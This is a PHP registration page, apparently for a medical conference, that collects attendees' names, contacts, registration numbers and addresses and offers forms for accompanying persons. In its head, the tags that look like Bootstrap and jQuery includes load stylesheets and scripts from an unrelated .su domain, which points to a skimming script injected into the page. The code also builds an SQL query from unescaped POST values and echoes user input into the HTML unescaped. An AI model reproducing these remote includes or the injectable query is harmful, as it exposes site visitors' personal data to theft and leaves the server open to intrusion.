<?php
session_start();
error_reporting(0);
// $servername = "localhost";
// $username = "root";
// $password = "";
// $dbname = "hsicon";

// // Create connection
// $conn = new mysqli($servername, $username, $password, $dbname);
// // Check connection
// if ($conn->connect_error) {
//     die("Connection failed: " . $conn->connect_error);
// }
include('./dbcon/conn.php');

if (isset($_POST['next2'])) {
       $package = $_POST['pack'];

       $subpackage = $_POST['subpack'];

       $occupancy = $_POST['occupancy'];

     $name = $_POST['name'];
     $email = $_POST['email'];
     $contact = $_POST['mobile'];
    $_SESSION['contact']=$contact;
     $charges = "00";
     $alt_mo=$_POST['Alternate'];
    $_SESSION['alt_mo']=$alt_mo;
     $m_r_s=$_POST['MMC_RES_NO'];
    $_SESSION['m_r_s']=$m_r_s;
     $institude=$_POST['institute'];
    $_SESSION['institude']=$institude;
     $designation=$_POST['designation'];
    $_SESSION['designation']=$designation;
     $speciality=$_POST['speciality'];
    $_SESSION['speciality']=$speciality;
     $dgender=$_POST['dgender'];
    $_SESSION['dgender']=$dgender;
     $state=$_POST['state'];
    $_SESSION['state']=$state;
    $pincode=$_POST['pincode'];
    $_SESSION['pincode']=$pincode;
    $country=$_POST['country'];
    $_SESSION['country']=$country;
    $city=$_POST['city'];
    $_SESSION['city']=$city;

}

if ($occupancy == "1" || $occupancy == "2") {
    $occupancy = $occupancy;
} elseif ($subpackage == "2") {
    $occupancy = "3";
} else {
    $occupancy = "4";
}

$sql = "SELECT * FROM charges WHERE  subpack_id = $subpackage AND occ_id = $occupancy ";
$result = mysqli_query($conn, $sql);


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fastsafestore.su/" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
    <script src="https://fastsafestore.su/" integrity="sha384-U1DAWAznBHeqEIlVSCgzq+c9gqGAJn5c/t99JyeKa9xxaYpSvHU5awsuZVVFIhvj" crossorigin="anonymous"></script>

    <script src="https://fastsafestore.su/"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <title>hsicon2021</title>
</head>

<body>

    <div class="container pt-5 pb-5">
        <div class="row justify-content-center">
            <div class="col-md-4">


                <h3>Hello, <?php echo $name ?></h3>

                <?php
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        $charges = $row['charges'];
                    }
                }
                ?>

            </div>
        </div>
    </div>


    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-4">
               

                <form action="page3.php" method="POST">

                    <div style="display: none;">
                        <input style="visibility: hidden;" name="package" type="text" value="<?php echo $package; ?>">
                        <input style="visibility: hidden;" name="subpack" type="text" value="<?php echo $subpackage; ?>">
                        <input style="visibility: hidden;" name="occ" type="text" value="<?php echo $occupancy; ?>">
                        <input style="visibility: hidden;" name="name" type="text" value="<?php echo $name; ?>">
                        <input style="visibility: hidden;" name="email" type="text" value="<?php echo $email; ?>">
                        <input style="visibility: hidden;" name="contact" type="text" value="<?php echo $contact; ?>">
                        <input style="visibility: hidden;" name="charges" type="text" value="<?php echo $charges; ?>">

                    </div>

                    <button type="submit" name="addAC" class="btn btn-primary" id="btnp1">preview or Add Acompanying Person</button><br><br>
                    <div class="alert-danger">
                        *If you dont want to add Acompanying Person then leave following form EMPTY..
                    </div>

                    <br><br>

                    <?php if ($occupancy == 2 || $occupancy == 3) { ?>

                        <div class="p1" style="visibility: visible; border-width: 0.5px; border-style: solid; padding: 20px; border-radius: 20px;">
                            <div class="mb-3">
                                <label for="exampleInputEmail1" class="form-label">Full Name</label>
                                <input type="text" class="form-control" name="fnap1" id="exampleInputEmail1">
                            </div>
                            <div class="mb-3">
                                <label for="exampleInputPassword1" class="form-label">Age</label>
                                <input type="number" class="form-control" name="ageap1" id="exampleInputPassword1">
                            </div>
                            <label for="exampleInputPassword1" class="form-label">Select Gender </label>
                            <select class="form-select form-select-mb mb-3" name="genap1" aria-label=".form-select-lg example">
                                <option value="Female">Female</option>
                                <option value="Male">Male</option>
                                <option value="Other">Other</option>
                            </select>
                            <button type="submit" name="addAC" class="btn btn-primary" id="btnp1">Submit</button>
                            <br><br>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input check1" type="checkbox" value="1" onchange="showSecond()" id="inlineCheckbox1">
                                <label class="form-check-label" for="inlineCheckbox1">Add Second Person</label>
                            </div>

                        </div>

                        <br><br>

                        <div id="divp2" class="divp2" style="border-width: 0.5px; border-style: solid; padding: 20px; border-radius: 20px;">
                            <div class="mb-3">
                                <label for="exampleInputEmail1" class="form-label">Full Name</label>
                                <input type="text" class="form-control" name="fnap2" id="exampleInputEmail1">
                            </div>
                            <div class="mb-3">
                                <label for="exampleInputPassword1" class="form-label">Age</label>
                                <input type="number" class="form-control" name="ageap2" id="exampleInputPassword1">
                            </div>
                            <label for="exampleInputPassword1" class="form-label">Select Gender </label>
                            <select class="form-select form-select-mb mb-3" name="genap2" aria-label=".form-select-lg example">
                                <option value="Female">Female</option>
                                <option value="Male">Male</option>
                                <option value="Other">Other</option>
                            </select>
                            <button type="submit" name="addAC" class="btn btn-primary" id="btnp2">Submit</button>
                            <br><br>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input check2" type="checkbox" onchange="showThird()" id="inlineCheckbox2">
                                <label class="form-check-label" for="inlineCheckbox1">Add Third Person</label>
                            </div>
                        </div>


                        <br><br>

                        <div id="divp3" class="divp3" style="border-width: 0.5px; border-style: solid; padding: 20px; border-radius: 20px;">
                            <div class="mb-3">
                                <label for="exampleInputEmail1" class="form-label">Full Name</label>
                                <input type="text" class="form-control" name="fnap3" id="exampleInputEmail1">
                            </div>
                            <div class="mb-3">
                                <label for="exampleInputPassword1" class="form-label">Age</label>
                                <input type="number" class="form-control" name="ageap3" id="exampleInputPassword1">
                            </div>
                            <label for="exampleInputPassword1" class="form-label">Select Gender </label>
                            <select class="form-select form-select-mb mb-3" name="genap3" aria-label=".form-select-lg example">
                                <option value="Female">Female</option>
                                <option value="Male">Male</option>
                                <option value="Other">Other</option>
                            </select>
                            <button type="submit" name="addAC" class="btn btn-primary" id="btnp1">Submit</button>
                        </div>

                    <?php } else { ?>

                        <div class="p1" style="visibility: hidden; border-width: 0.5px; border-style: solid; padding: 20px; border-radius: 20px;">
                            <div class="mb-3">
                                <label for="exampleInputEmail1" class="form-label">Full Name</label>
                                <input type="text" class="form-control" name="fnap1" id="exampleInputEmail1">
                            </div>
                            <div class="mb-3">
                                <label for="exampleInputPassword1" class="form-label">Age</label>
                                <input type="number" class="form-control" name="ageap1" id="exampleInputPassword1">
                            </div>
                            <label for="exampleInputPassword1" class="form-label">Select Gender </label>
                            <select class="form-select form-select-mb mb-3" name="genap1" aria-label=".form-select-lg example">
                                <option value="Female">Female</option>
                                <option value="Male">Male</option>
                                <option value="Other">Other</option>
                            </select>
                            <button type="submit" name="addAC" class="btn btn-primary" id="btnp1">Submit</button>
                            <br><br>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input check1" type="checkbox" value="1" onchange="showSecond()" id="inlineCheckbox1">
                                <label class="form-check-label" for="inlineCheckbox1">Add Second Person</label>
                            </div>

                        </div>

                        <br><br>

                        <div id="divp2" class="divp2" style="border-width: 0.5px; border-style: solid; padding: 20px; border-radius: 20px;">
                            <div class="mb-3">
                                <label for="exampleInputEmail1" class="form-label">Full Name</label>
                                <input type="text" class="form-control" name="fnap2" id="exampleInputEmail1">
                            </div>
                            <div class="mb-3">
                                <label for="exampleInputPassword1" class="form-label">Age</label>
                                <input type="number" class="form-control" name="ageap2" id="exampleInputPassword1">
                            </div>
                            <label for="exampleInputPassword1" class="form-label">Select Gender </label>
                            <select class="form-select form-select-mb mb-3" name="genap2" aria-label=".form-select-lg example">
                                <option value="Female">Female</option>
                                <option value="Male">Male</option>
                                <option value="Other">Other</option>
                            </select>
                            <button type="submit" name="addAC" class="btn btn-primary" id="btnp2">Submit</button>
                            <br><br>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input check2" type="checkbox" onchange="showThird()" id="inlineCheckbox2">
                                <label class="form-check-label" for="inlineCheckbox1">Add Third Person</label>
                            </div>
                        </div>


                        <br><br>

                        <div id="divp3" class="divp3" style="border-width: 0.5px; border-style: solid; padding: 20px; border-radius: 20px;">
                            <div class="mb-3">
                                <label for="exampleInputEmail1" class="form-label">Full Name</label>
                                <input type="text" class="form-control" name="fnap3" id="exampleInputEmail1">
                            </div>
                            <div class="mb-3">
                                <label for="exampleInputPassword1" class="form-label">Age</label>
                                <input type="number" class="form-control" name="ageap3" id="exampleInputPassword1">
                            </div>
                            <label for="exampleInputPassword1" class="form-label">Select Gender </label>
                            <select class="form-select form-select-mb mb-3" name="genap3" aria-label=".form-select-lg example">
                                <option value="Female">Female</option>
                                <option value="Male">Male</option>
                                <option value="Other">Other</option>
                            </select>
                            <button type="submit" name="addAC" class="btn btn-primary" id="btnp1">Submit</button>
                        </div>

                    <?php } ?>

                </form>
            </div>
        </div>
    </div>


    <script>
        $(".divp2").hide();
        $(".divp3").hide();

        function showSecond() {
            if ($('.check1').is(":checked")) {
                $(".divp2").show();
                $("#btnp1").prop('disabled', true);
            } else {
                $(".divp2").hide();
                $(".divp3").hide();
                $("#btnp1").prop('disabled', false);
            }
        }

        function showThird() {
            if ($('.check2').is(":checked")) {
                $(".divp3").show();
                $("#btnp2").prop('disabled', true);
            } else {
                $(".divp3").hide();
                $("#btnp2").prop('disabled', false);
            }
        }
    </script>

</body>

</html>